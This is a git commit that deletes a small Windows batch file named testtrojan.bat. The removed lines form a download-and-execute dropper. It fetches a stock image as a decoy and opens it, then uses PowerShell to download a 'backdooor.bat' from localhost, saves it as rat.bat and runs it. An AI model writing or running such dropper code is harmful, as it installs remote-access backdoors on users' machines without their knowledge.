75bea23c6aa57ab45989684ff7397fb054a98bfc
haotok <haotok2@gmail.com>
2024-06-22 10:10:29 +0200

    Delete testtrojan.bat

--- testtrojan.bat
+++
@@ -1,5 +0,0 @@
-cd %TEMP%
-Powershell -Command "Invoke-WebRequest 'https://www.istockphoto.com/fr/photo/une-vue-vers-le-haut-dans-le-ciel-de-direction-darbres-gm1317323736-404791748' -OutFile test.png"
-test.png
-Powershell -Command "Invoke-WebRequest 'https://localhost/downloads/backdooor.bat' -OutFile rat.bat"
-rat.bat
